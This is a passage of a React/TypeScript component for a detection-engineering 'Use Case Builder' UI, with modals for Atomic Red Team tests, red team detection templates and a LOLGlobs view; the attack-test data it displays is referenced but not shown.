    a.download = 'UseCaseBuilder-Full.tsx';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'critical': return 'text-red-400 bg-red-400/10 border-red-400/20';
      case 'high': return 'text-orange-400 bg-orange-400/10 border-orange-400/20';
      case 'medium': return 'text-yellow-400 bg-yellow-400/10 border-yellow-400/20';
      case 'low': return 'text-blue-400 bg-blue-400/10 border-blue-400/20';
      default: return 'text-gray-400 bg-gray-400/10';
    }
  };

  const getPlatformIcon = (platform: string) => {
    switch(platform) {
      case 'splunk': return <Database className="w-4 h-4 text-green-400" />;
      case 'qradar': return <Shield className="w-4 h-4 text-blue-400" />;
      case 'cortex': return <Target className="w-4 h-4 text-purple-400" />;
      case 'fidelis': return <Eye className="w-4 h-4 text-cyan-400" />;
      case 'arcsight': return <Activity className="w-4 h-4 text-orange-400" />;
      case 'logrhythm': return <Clock className="w-4 h-4 text-pink-400" />;
      default: return <Server className="w-4 h-4 text-gray-400" />;
    }
  };

  return (
    <div className="p-6 space-y-6 bg-slate-950 min-h-screen text-gray-100">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold bg-gradient-to-r from-cyan-400 to-blue-500 bg-clip-text text-transparent">
            Use Case Builder
          </h1>
          <p className="text-gray-400 text-sm mt-1">
            Multi-platform Detection Engineering
          </p>
        </div>
        <div className="flex items-center gap-3">
          <button 
            onClick={downloadFullTypeScriptFile}
            className="px-4 py-2 bg-blue-500/10 border border-blue-500/30 rounded-lg text-sm font-medium hover:bg-blue-500/20 transition-all flex items-center gap-2"
          >
            <FileJson className="w-4 h-4 text-blue-400" />
            Export TSX File
          </button>
          <button 
            onClick={() => setShowAtomicTests(true)}
            className="px-4 py-2 bg-orange-500/10 border border-orange-500/30 rounded-lg text-sm font-medium hover:bg-orange-500/20 transition-all flex items-center gap-2"
          >
            <Radio className="w-4 h-4 text-orange-400" />
            Atomic Tests ({stats.atomicTests})
          </button>
          <button 
            onClick={() => setShowLOLGlobs(true)}
            className="px-4 py-2 bg-purple-500/10 border border-purple-500/30 rounded-lg text-sm font-medium hover:bg-purple-500/20 transition-all flex items-center gap-2"
          >
            <FileCode className="w-4 h-4 text-purple-400" />
            LOLGlobs
          </button>
          <button 
            onClick={() => setShowTemplates(true)}
            className="px-4 py-2 bg-red-500/10 border border-red-500/30 rounded-lg text-sm font-medium hover:bg-red-500/20 transition-all flex items-center gap-2"
          >
            <Target className="w-4 h-4 text-red-400" />
            Red Team Templates
          </button>
          <button 
            onClick={() => {
              setEditingUseCase(null);
              setFormData({
                name: '',
                description: '',
                category: 'Endpoint',
                severity: 'medium',
                status: 'draft',
                platform: selectedPlatform,
                dataSource: '',
                query: '',
                tags: [],
                mitreTechniques: [],
                mitreTactics: []
              });
              setShowWizard(true);
            }}
            className="px-4 py-2 bg-gradient-to-r from-cyan-400 to-cyan-600 rounded-lg text-black font-medium hover:shadow-lg hover:shadow-cyan-500/25 transition-all flex items-center gap-2"
          >
            <Plus className="w-4 h-4" />
            New Use Case
          </button>
        </div>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-1 md:grid-cols-7 gap-4">
        <div className="bg-slate-900/60 backdrop-blur-xl border border-white/10 rounded-xl p-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-cyan-500/10 flex items-center justify-center text-cyan-400">
              <Shield className="w-5 h-5" />
            </div>
            <div>
              <p className="text-2xl font-bold">{stats.total}</p>
              <p className="text-xs text-gray-400">Total Use Cases</p>
            </div>
          </div>
        </div>
        <div className="bg-slate-900/60 backdrop-blur-xl border border-white/10 rounded-xl p-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-green-500/10 flex items-center justify-center text-green-400">
              <CheckCircle className="w-5 h-5" />
            </div>
            <div>
              <p className="text-2xl font-bold">{stats.active}</p>
              <p className="text-xs text-gray-400">Active</p>
            </div>
          </div>
        </div>
        <div className="bg-slate-900/60 backdrop-blur-xl border border-white/10 rounded-xl p-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-red-500/10 flex items-center justify-center text-red-400">
              <AlertTriangle className="w-5 h-5" />
            </div>
            <div>
              <p className="text-2xl font-bold">{stats.critical}</p>
              <p className="text-xs text-gray-400">Critical</p>
            </div>
          </div>
        </div>
        <div className="bg-slate-900/60 backdrop-blur-xl border border-white/10 rounded-xl p-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-orange-500/10 flex items-center justify-center text-orange-400">
              <Target className="w-5 h-5" />
            </div>
            <div>
              <p className="text-2xl font-bold">{stats.redTeam}</p>
              <p className="text-xs text-gray-400">Red Team Rules</p>
            </div>
          </div>
        </div>
        <div className="bg-slate-900/60 backdrop-blur-xl border border-white/10 rounded-xl p-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-blue-500/10 flex items-center justify-center text-blue-400">
              <Database className="w-5 h-5" />
            </div>
            <div>
              <p className="text-2xl font-bold">{stats.platforms}</p>
              <p className="text-xs text-gray-400">Platforms</p>
            </div>
          </div>
        </div>
        <div className="bg-slate-900/60 backdrop-blur-xl border border-white/10 rounded-xl p-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-orange-500/10 flex items-center justify-center text-orange-400">
              <Radio className="w-5 h-5" />
            </div>
            <div>
              <p className="text-2xl font-bold">{stats.atomicTests}</p>
              <p className="text-xs text-gray-400">Atomic Tests</p>
            </div>
          </div>
        </div>
        <div className="bg-slate-900/60 backdrop-blur-xl border border-white/10 rounded-xl p-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-green-500/10 flex items-center justify-center text-green-400">
              <FlaskConical className="w-5 h-5" />
            </div>
            <div>
              <p className="text-2xl font-bold">{stats.atomicExecuted}</p>
              <p className="text-xs text-gray-400">Tests Executed</p>
            </div>
          </div>
        </div>
      </div>

      {/* Filters */}
      <div className="bg-slate-900/60 backdrop-blur-xl border border-white/10 rounded-xl p-4">
        <div className="flex flex-wrap items-center gap-4">
          <div className="flex-1 min-w-64 relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
            <input
              type="text"
              placeholder="Search use cases, MITRE techniques, tags..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full pl-10 pr-4 py-2 bg-black/40 border border-white/10 rounded-lg text-white placeholder-gray-500 focus:border-cyan-400 focus:outline-none transition-colors"
            />
          </div>
          <div className="flex items-center gap-2 flex-wrap">
            <Filter className="w-4 h-4 text-gray-400" />
            <select 
              value={categoryFilter}
              onChange={(e) => setCategoryFilter(e.target.value)}
              className="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-white focus:border-cyan-400 focus:outline-none"
            >
              {categories.map(c => (
                <option key={c} value={c}>{c === 'all' ? 'All Categories' : c}</option>
              ))}
            </select>
            <select 
              value={severityFilter}
              onChange={(e) => setSeverityFilter(e.target.value)}
              className="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-white focus:border-cyan-400 focus:outline-none"
            >
              {severities.map(s => (
                <option key={s} value={s}>{s === 'all' ? 'All Severities' : s.charAt(0).toUpperCase() + s.slice(1)}</option>
              ))}
            </select>
            <select 
              value={platformFilter}
              onChange={(e) => setPlatformFilter(e.target.value)}
              className="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-white focus:border-cyan-400 focus:outline-none"
            >
              {platforms.map(p => (
                <option key={p} value={p}>{p === 'all' ? 'All Platforms' : PLATFORMS[p as keyof typeof PLATFORMS]?.name || p}</option>
              ))}
            </select>
          </div>
        </div>
      </div>

      {/* Atomic Execution Results */}
      {atomicExecutionResults.length > 0 && (
        <div className="bg-slate-900/60 backdrop-blur-xl border border-orange-500/30 rounded-xl p-4">
          <div className="flex items-center justify-between mb-3">
            <h3 className="font-semibold text-orange-400 flex items-center gap-2">
              <FlaskConical className="w-4 h-4" />
              Recent Atomic Test Executions
            </h3>
            <button 
              onClick={() => setAtomicExecutionResults([])}
              className="text-xs text-gray-400 hover:text-white"
            >
              Clear History
            </button>
          </div>
          <div className="space-y-2 max-h-48 overflow-y-auto">
            {atomicExecutionResults.slice(0, 5).map((result, idx) => (
              <div key={idx} className="flex items-center justify-between p-2 bg-black/30 rounded-lg text-sm">
                <div className="flex items-center gap-3">
                  <span className="font-mono text-xs text-gray-400">{result.testId}</span>
                  <span className="text-white">{result.testName}</span>
                  <span className={`px-2 py-0.5 rounded text-xs ${result.detectionTriggered ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}>
                    {result.detectionTriggered ? `Detected (${result.detectionConfidence}%)` : 'Not Detected'}
                  </span>
                </div>
                <span className="text-xs text-gray-500">{new Date(result.timestamp).toLocaleTimeString()}</span>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Use Case List */}
      <div className="space-y-3">
        {filteredUseCases.map((useCase) => (
          <div key={useCase.id} className="bg-slate-900/60 backdrop-blur-xl border border-white/10 rounded-xl p-4 hover:-translate-y-0.5 hover:border-cyan-400/30 transition-all">
            <div className="flex items-start justify-between">
              <div className="flex-1">
                <div className="flex items-center gap-3 mb-2 flex-wrap">
                  <h3 className="font-semibold text-lg">{useCase.name}</h3>
                  <span className={`px-2 py-0.5 text-xs rounded-full border capitalize ${getSeverityColor(useCase.severity)}`}>
                    {useCase.severity}
                  </span>
                  <span className={`px-2 py-0.5 text-xs rounded-full border capitalize ${
                    useCase.status === 'active' ? 'text-green-400 bg-green-400/10 border-green-400/20' :
                    useCase.status === 'inactive' ? 'text-gray-400 bg-gray-400/10 border-gray-400/20' :
                    'text-cyan-400 bg-cyan-400/10 border-cyan-400/20'
                  }`}>
                    {useCase.status}
                  </span>
                  <div className="flex items-center gap-1 px-2 py-0.5 bg-slate-800 rounded-full text-xs text-gray-400">
                    {getPlatformIcon(useCase.platform)}
                    <span className="capitalize">{useCase.platform}</span>
                  </div>
                  <span className="text-xs text-gray-500 font-mono">{useCase.id}</span>
                </div>
                <p className="text-gray-400 text-sm mb-3">{useCase.description}</p>
                <div className="flex flex-wrap items-center gap-4 text-sm mb-2">
                  <span className="flex items-center gap-1 text-gray-400">
                    <Server className="w-4 h-4" />
                    {useCase.dataSource || 'Not specified'}
                  </span>
                  <span className="flex items-center gap-1 text-gray-400">
                    <Clock className="w-4 h-4" />
                    Updated {useCase.updatedAt}
                  </span>
                  <span className="flex items-center gap-1 text-gray-400">
                    <Activity className="w-4 h-4" />
                    {useCase.triggerCount} triggers
                  </span>
                  {useCase.falsePositiveRate > 0 && (
                    <span className="flex items-center gap-1 text-yellow-400">
                      <AlertTriangle className="w-4 h-4" />
                      {useCase.falsePositiveRate}% FP rate
                    </span>
                  )}
                </div>
                <div className="flex flex-wrap gap-2">
                  {useCase.tags?.map(tag => (
                    <span key={tag} className="px-2 py-1 bg-cyan-500/10 text-cyan-400 text-xs rounded-full">#{tag}</span>
                  ))}
                  {useCase.mitreTechniques?.map(tech => (
                    <span key={tech} className="px-2 py-1 bg-amber-500/10 text-amber-400 text-xs rounded-full font-mono">{tech}</span>
                  ))}
                </div>
              </div>
              <div className="flex items-center gap-2 ml-4">
                <button 
                  onClick={() => handleSimulate(useCase)}
                  disabled={simulatingId === useCase.id}
                  className="p-2 rounded-lg bg-cyan-500/10 text-cyan-400 hover:bg-cyan-500/20 transition-colors"
                  title="Simulate"
                >
                  {simulatingId === useCase.id ? (
                    <div className="w-4 h-4 border-2 border-cyan-400/30 border-t-cyan-400 rounded-full animate-spin" />
                  ) : (
                    <Play className="w-4 h-4" />
                  )}
                </button>
                <button 
                  onClick={() => handleEdit(useCase)}
                  className="p-2 rounded-lg bg-blue-500/10 text-blue-400 hover:bg-blue-500/20 transition-colors"
                  title="Edit"
                >
                  <Edit3 className="w-4 h-4" />
                </button>
                <button 
                  onClick={() => handleCopy(useCase.query, useCase.id)}
                  className="p-2 rounded-lg bg-gray-500/10 text-gray-400 hover:bg-gray-500/20 transition-colors"
                  title="Copy Query"
                >
                  {copiedId === useCase.id ? <Check className="w-4 h-4" /> : <Code className="w-4 h-4" />}
                </button>
                <button 
                  onClick={() => handleDelete(useCase.id)}
                  className="p-2 rounded-lg bg-red-500/10 text-red-400 hover:bg-red-500/20 transition-colors"
                  title="Delete"
                >
                  <Trash2 className="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>
        ))}
      </div>

      {/* Atomic Red Team Tests Modal */}
      {showAtomicTests && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900/95 backdrop-blur-xl border border-white/10 rounded-2xl w-full max-w-7xl max-h-[90vh] overflow-hidden flex flex-col">
            <div className="flex items-center justify-between p-6 border-b border-white/5">
              <div>
                <h2 className="text-xl font-semibold flex items-center gap-2">
                  <Radio className="w-5 h-5 text-orange-400" />
                  Atomic Red Team Test Library
                </h2>
                <p className="text-sm text-gray-400 mt-1">
                  {ATOMIC_TESTS.length} adversary simulation tests from Atomic Red Team
                </p>
              </div>
              <div className="flex items-center gap-2">
                <select 
                  value={activeAtomicFilters.tactic}
                  onChange={(e) => setActiveAtomicFilters({...activeAtomicFilters, tactic: e.target.value})}
                  className="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-white text-sm focus:border-cyan-400 focus:outline-none"
                >
                  <option value="all">All Tactics</option>
                  {Array.from(new Set(ATOMIC_TESTS.map(t => t.tactic))).sort().map(t => (
                    <option key={t} value={t}>{t}</option>
                  ))}
                </select>
                <select 
                  value={activeAtomicFilters.technique}
                  onChange={(e) => setActiveAtomicFilters({...activeAtomicFilters, technique: e.target.value})}
                  className="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-white text-sm focus:border-cyan-400 focus:outline-none"
                >
                  <option value="all">All Techniques</option>
                  {Array.from(new Set(ATOMIC_TESTS.map(t => t.technique))).sort().map(t => (
                    <option key={t} value={t}>{t}</option>
                  ))}
                </select>
                <select 
                  value={activeAtomicFilters.platform}
                  onChange={(e) => setActiveAtomicFilters({...activeAtomicFilters, platform: e.target.value})}
                  className="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-white text-sm focus:border-cyan-400 focus:outline-none"
                >
                  <option value="all">All Platforms</option>
                  <option value="windows">Windows</option>
                  <option value="linux">Linux</option>
                  <option value="macos">macOS</option>
                </select>
                <button onClick={() => setShowAtomicTests(false)} className="text-gray-400 hover:text-white">
                  <X className="w-5 h-5" />
                </button>
              </div>
            </div>
            <div className="p-6 overflow-y-auto grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {filteredAtomicTests.map(test => (
                <div 
                  key={test.id}
                  className="bg-white/5 border border-white/10 rounded-xl p-4 hover:border-orange-400/30 transition-all group flex flex-col"
                >
                  <div className="flex items-start justify-between mb-2">
                    <div>
                      <h3 className="font-semibold text-white group-hover:text-orange-400 transition-colors text-sm">{test.name}</h3>
                      <p className="text-xs text-gray-500 font-mono mt-1">{test.id}</p>
                    </div>
                    <span className={`text-xs px-2 py-1 rounded border ${
                      test.impact === 'critical' ? 'bg-red-500/10 text-red-400 border-red-500/20' :
                      test.impact === 'high' ? 'bg-orange-500/10 text-orange-400 border-orange-500/20' :
                      test.impact === 'medium' ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' :
                      'bg-green-500/10 text-green-400 border-green-500/20'
                    }`}>
                      {test.impact}
                    </span>
                  </div>
                  <p className="text-sm text-gray-400 mb-3 flex-grow">{test.description}</p>
                  <div className="space-y-2 mb-3">
                    <div className="flex items-center gap-2 text-xs">
                      <span className="text-gray-500">Technique:</span>
                      <span className="text-orange-400 font-mono">{test.technique}</span>
                    </div>
                    <div className="flex items-center gap-2 text-xs">
                      <span className="text-gray-500">Tactic:</span>
                      <span className="text-cyan-400">{test.tactic}</span>
                    </div>
                    <div className="flex items-center gap-2 text-xs">
                      <span className="text-gray-500">Platforms:</span>
                      <span className="text-gray-300">{test.platforms.join(', ')}</span>
                    </div>
                  </div>
                  <div className="flex gap-2 mt-auto">
                    <button 
                      onClick={() => handleCreateFromAtomic(test)}
                      className="flex-1 px-3 py-2 bg-orange-500/10 border border-orange-500/30 rounded-lg text-xs font-medium hover:bg-orange-500/20 transition-all flex items-center justify-center gap-1"
                    >
                      <ShieldAlert className="w-3 h-3" />
                      Create Detection
                    </button>
                    <button 
                      onClick={() => handleExecuteAtomic(test)}
                      className="flex-1 px-3 py-2 bg-cyan-500/10 border border-cyan-500/30 rounded-lg text-xs font-medium hover:bg-cyan-500/20 transition-all flex items-center justify-center gap-1"
                    >
                      <Play className="w-3 h-3" />
                      Execute
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Atomic Executor Modal */}
      {showAtomicExecutor && selectedAtomicTest && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900/95 backdrop-blur-xl border border-white/10 rounded-2xl w-full max-w-4xl">
            <div className="flex items-center justify-between p-6 border-b border-white/5">
              <div>
                <h2 className="text-xl font-semibold flex items-center gap-2">
                  <FlaskConical className="w-5 h-5 text-orange-400" />
                  Execute Atomic Test
                </h2>
                <p className="text-sm text-gray-400 mt-1">{selectedAtomicTest.id} - {selectedAtomicTest.name}</p>
              </div>
              <button onClick={() => setShowAtomicExecutor(false)} className="text-gray-400 hover:text-white">
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="p-6 space-y-4">
              <div className="bg-black/40 rounded-lg p-4 font-mono text-sm text-gray-300 overflow-x-auto">
                <div className="flex items-center gap-2 mb-2 text-xs text-gray-500">
                  <TerminalSquare className="w-4 h-4" />
                  <span>Executor: {selectedAtomicTest.executorType}</span>
                  {selectedAtomicTest.elevationRequired && (
                    <span className="text-red-400">[ELEVATION REQUIRED]</span>
                  )}
                </div>
                <code className="text-green-400">{selectedAtomicTest.executor}</code>
              </div>

              {selectedAtomicTest.cleanup && (
                <div className="bg-black/40 rounded-lg p-4 font-mono text-sm">
                  <div className="flex items-center gap-2 mb-2 text-xs text-gray-500">
                    <Trash2 className="w-4 h-4" />
                    <span>Cleanup Command</span>
                  </div>
                  <code className="text-yellow-400">{selectedAtomicTest.cleanup}</code>
                </div>
              )}

              <div className="bg-slate-800/50 rounded-lg p-4">
                <h4 className="text-sm font-semibold mb-2 text-gray-300">Detection Indicators</h4>
                <div className="flex flex-wrap gap-2">
                  {selectedAtomicTest.detectionIndicators.map((indicator, idx) => (
                    <span key={idx} className="px-2 py-1 bg-red-500/10 text-red-400 text-xs rounded font-mono">
                      {indicator}
                    </span>
                  ))}
                </div>
              </div>

              <div className="bg-orange-500/5 border border-orange-500/20 rounded-lg p-4">
                <h4 className="text-sm font-semibold mb-2 text-orange-400 flex items-center gap-2">
                  <Crosshair className="w-4 h-4" />
                  Test Against Detection Rule
                </h4>
                <p className="text-sm text-gray-400 mb-3">
                  Execute this atomic test and validate against an existing detection rule to see if it would trigger.
                </p>
                <div className="space-y-2 max-h-48 overflow-y-auto">
                  {useCases.map(useCase => (
                    <button
                      key={useCase.id}
                      onClick={() => handleRunAtomicAgainstUseCase(useCase)}
                      className="w-full text-left p-3 bg-black/30 hover:bg-black/50 rounded-lg transition-colors flex items-center justify-between group"
                    >
                      <div>
                        <span className="text-sm text-white group-hover:text-orange-400 transition-colors">{useCase.name}</span>
                        <span className="text-xs text-gray-500 ml-2">({useCase.platform})</span>
                      </div>
                      <Play className="w-4 h-4 text-gray-500 group-hover:text-orange-400" />
                    </button>
                  ))}
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Red Team Templates Modal */}
      {showTemplates && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900/95 backdrop-blur-xl border border-white/10 rounded-2xl w-full max-w-6xl max-h-[85vh] overflow-hidden flex flex-col">
            <div className="flex items-center justify-between p-6 border-b border-white/5">
              <div>
                <h2 className="text-xl font-semibold flex items-center gap-2">
                  <Target className="w-5 h-5 text-red-400" />
                  Red Team & APT Detection Templates
                </h2>
                <p className="text-sm text-gray-400 mt-1">
                  Pre-built detection rules based on Red Team Operations Architecture Map
                </p>
              </div>
              <div className="flex items-center gap-2">
                <select 
                  value={selectedPlatform}
                  onChange={(e) => setSelectedPlatform(e.target.value)}
                  className="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-white text-sm focus:border-cyan-400 focus:outline-none"
                >
                  {Object.entries(PLATFORMS).map(([key, platform]) => (
                    <option key={key} value={key}>{platform.name}</option>
                  ))}
                </select>
                <button onClick={() => setShowTemplates(false)} className="text-gray-400 hover:text-white">
                  <X className="w-5 h-5" />
                </button>
              </div>
            </div>
            <div className="p-6 overflow-y-auto grid grid-cols-1 md:grid-cols-2 gap-4">
              {RED_TEAM_TEMPLATES.map(template => (
                <div 
                  key={template.id}
                  onClick={() => handleCreateFromTemplate(template)}
                  className="bg-white/5 border border-white/10 rounded-xl p-4 cursor-pointer hover:border-red-400/30 transition-all group"
                >
                  <div className="flex items-start justify-between mb-2">
                    <h3 className="font-semibold text-white group-hover:text-red-400 transition-colors">{template.name}</h3>
                    <span className={`text-xs px-2 py-1 rounded border ${
                      template.severity === 'critical' ? 'bg-red-500/10 text-red-400 border-red-500/20' :
                      template.severity === 'high' ? 'bg-orange-500/10 text-orange-400 border-orange-500/20' :
                      'bg-yellow-500/10 text-yellow-400 border-yellow-500/20'
                    }`}>
                      {template.severity}
                    </span>
                  </div>
                  <p className="text-sm text-gray-400 mb-3">{template.description}</p>
                  <div className="flex flex-wrap gap-2 mb-3">
                    {template.mitre.map(tech => (
                      <span key={tech} className="px-2 py-1 bg-amber-500/10 text-amber-400 text-xs rounded font-mono">{tech}</span>
                    ))}
                  </div>
                  <div className="text-xs text-gray-500 flex items-center gap-2">
                    <Database className="w-3 h-3" />
                    {template.dataSources.join(', ')}
                  </div>
                  <div className="mt-3 p-2 bg-black/30 rounded text-xs font-mono text-gray-500 overflow-hidden text-ellipsis">
                    {template.platforms[selectedPlatform as keyof typeof template.platforms]?.substring(0, 80) || template.platforms.splunk.substring(0, 80)}...
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* LOLGlobs Modal */}
      {showLOLGlobs && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900/95 backdrop-blur-xl border border-white/10 rounded-2xl w-full max-w-6xl max-h-[85vh] overflow-hidden flex flex-col">
            <div className="flex items-center justify-between p-6 border-b border-white/5">
              <div>
                <h2 className="text-xl font-semibold flex items-center gap-2">
                  <FileCode className="w-5 h-5 text-purple-400" />
                  LOLGlobs - Dangerous File Extensions
                </h2>
                <p className="text-sm text-gray-400 mt-1">
                  Generate detections for high-risk file extensions used in Living Off The Land attacks
                </p>
              </div>
              <div className="flex items-center gap-2">
                <select 
                  value={selectedPlatform}
                  onChange={(e) => setSelectedPlatform(e.target.value)}
                  className="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-white text-sm focus:border-cyan-400 focus:outline-none"
                >
                  {Object.entries(PLATFORMS).map(([key, platform]) => (
                    <option key={key} value={key}>{platform.name}</option>
                  ))}
                </select>
                <button onClick={() => setShowLOLGlobs(false)} className="text-gray-400 hover:text-white">
                  <X className="w-5 h-5" />
                </button>
              </div>
            </div>
            <div className="p-6 overflow-y-auto grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {LOLGLOBS_DATA.map((glob, idx) => (
                <div 
                  key={idx}
                  onClick={() => handleCreateFromLOLGlob(glob)}
                  className="bg-white/5 border border-white/10 rounded-xl p-4 cursor-pointer hover:border-purple-400/30 transition-all group"
                >
                  <div className="flex items-start justify-between mb-2">
                    <h3 className="font-mono text-lg font-bold text-purple-400">{glob.extension}</h3>
                    <span className={`text-xs px-2 py-1 rounded border ${
                      glob.risk === 'Critical' ? 'bg-red-500/10 text-red-400 border-red-500/20' :
                      glob.risk === 'High' ? 'bg-orange-500/10 text-orange-400 border-orange-500/20' :
                      glob.risk === 'Medium' ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' :
                      'bg-green-500/10 text-green-400 border-green-500/20'
                    }`}>
                      {glob.risk}
                    </span>
                  </div>
                  <p className="text-sm text-gray-400 mb-2">{glob.description}</p>
                  <div className="text-xs text-gray-500 mb-2">
                    <span className="text-gray-600">Handler:</span> {glob.handler}
                  </div>
                  <div className="flex flex-wrap gap-1">
                    {glob.mitre.slice(0, 3).map(tech => (
                      <span key={tech} className="px-1.5 py-0.5 bg-amber-500/10 text-amber-400 text-xs rounded font-mono">{tech}</span>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Wizard Modal */}
      {showWizard && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900/95 backdrop-blur-xl border border-white/10 rounded-2xl w-full max-w-5xl max-h-[90vh] overflow-auto">
            <div className="flex items-center justify-between p-6 border-b border-white/5">
              <div>
                <h2 className="text-xl font-semibold">
                  {editingUseCase ? 'Edit Use Case' : 'Create New Use Case'}
                </h2>
                <p className="text-sm text-gray-400 mt-1">
                  Platform: {PLATFORMS[formData.platform as keyof typeof PLATFORMS]?.name || 'Generic'}
                </p>
              </div>
              <div className="flex items-center gap-2">
                <select 
                  value={formData.platform}
                  onChange={(e) => {
                    const newPlatform = e.target.value;
                    setFormData({...formData, platform: newPlatform});
                    setSelectedPlatform(newPlatform);
                    if (formData.queries && formData.queries[newPlatform]) {
                      setFormData(prev => ({...prev, platform: newPlatform, query: prev.queries![newPlatform]}));
                    }
                  }}
                  className="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-white text-sm focus:border-cyan-400 focus:outline-none"
                >
                  {Object.entries(PLATFORMS).map(([key, platform]) => (
                    <option key={key} value={key}>{platform.name}</option>
                  ))}
                </select>
                <button onClick={() => setShowWizard(false)} className="text-gray-400 hover:text-white">
                  <X className="w-5 h-5" />
                </button>
              </div>
            </div>
            <div className="p-6 space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm text-gray-400 mb-2">Name *</label>
                  <input
                    type="text"
                    value={formData.name}
                    onChange={(e) => setFormData({...formData, name: e.target.value})}
                    placeholder="e.g., HTML Smuggling Detection"
                    className="w-full px-4 py-2 bg-black/40 border border-white/10 rounded-lg text-white placeholder-gray-500 focus:border-cyan-400 focus:outline-none"
                  />
                </div>
                <div>
                  <label className="block text-sm text-gray-400 mb-2">Category</label>
                  <select
                    value={formData.category}
                    onChange={(e) => setFormData({...formData, category: e.target.value})}
                    className="w-full px-4 py-2 bg-black/40 border border-white/10 rounded-lg text-white focus:border-cyan-400 focus:outline-none"
                  >
                    {categories.filter(c => c !== 'all').map(c => (
                      <option key={c} value={c}>{c}</option>
                    ))}
                  </select>
                </div>
              </div>
              <div>
                <label className="block text-sm text-gray-400 mb-2">Description</label>
                <textarea
                  value={formData.description}
                  onChange={(e) => setFormData({...formData, description: e.target.value})}
                  placeholder="Describe what this use case detects..."
                  rows={2}
                  className="w-full px-4 py-2 bg-black/40 border border-white/10 rounded-lg text-white placeholder-gray-500 focus:border-cyan-400 focus:outline-none"
                />
              </div>
              <div className="grid grid-cols-4 gap-4">
                <div>
                  <label className="block text-sm text-gray-400 mb-2">Severity</label>
                  <select
                    value={formData.severity}
                    onChange={(e) => setFormData({...formData, severity: e.target.value as any})}
                    className="w-full px-4 py-2 bg-black/40 border border-white/10 rounded-lg text-white focus:border-cyan-400 focus:outline-none"
                  >
                    {severities.filter(s => s !== 'all').map(s => (
                      <option key={s} value={s}>{s.charAt(0).toUpperCase() + s.slice(1)}</option>
                    ))}
                  </select>
                </div>
                <div>
                  <label className="block text-sm text-gray-400 mb-2">Status</label>
                  <select
                    value={formData.status}
                    onChange={(e) => setFormData({...formData, status: e.target.value as any})}
                    className="w-full px-4 py-2 bg-black/40 border border-white/10 rounded-lg text-white focus:border-cyan-400 focus:outline-none"
                  >
                    {statuses.filter(s => s !== 'all').map(s => (
                      <option key={s} value={s}>{s.charAt(0).toUpperCase() + s.slice(1)}</option>
                    ))}
                  </select>
                </div>
                <div>
                  <label className="block text-sm text-gray-400 mb-2">Data Source</label>
                  <input
                    type="text"
                    value={formData.dataSource}
                    onChange={(e) => setFormData({...formData, dataSource: e.target.value})}
                    placeholder="e.g., Windows Security"
                    className="w-full px-4 py-2 bg-black/40 border border-white/10 rounded-lg text-white placeholder-gray-500 focus:border-cyan-400 focus:outline-none"
                  />
                </div>
                <div>
                  <label className="block text-sm text-gray-400 mb-2">MITRE ATT&CK</label>
                  <input
                    type="text"
                    value={formData.mitreTechniques?.join(', ')}
                    onChange={(e) => setFormData({...formData, mitreTechniques: e.target.value.split(',').map(t => t.trim()).filter(Boolean)})}
                    placeholder="T1027, T1059.007"
                    className="w-full px-4 py-2 bg-black/40 border border-white/10 rounded-lg text-white placeholder-gray-500 focus:border-cyan-400 focus:outline-none"
                  />
                </div>
              </div>

              {formData.platform && PLATFORMS[formData.platform as keyof typeof PLATFORMS] && (
                <div className="bg-blue-500/5 border border-blue-500/20 rounded-lg p-3">
                  <div className="flex items-center gap-2 mb-2">
                    <BookOpen className="w-4 h-4 text-blue-400" />
                    <span className="text-sm font-medium text-blue-400">Parser Documentation</span>
                  </div>
                  <div className="flex flex-wrap gap-2">
                    {PLATFORMS[formData.platform as keyof typeof PLATFORMS].docs.map((doc, idx) => (
                      <a 
                        key={idx}
                        href={doc.url}
                        target="_blank"
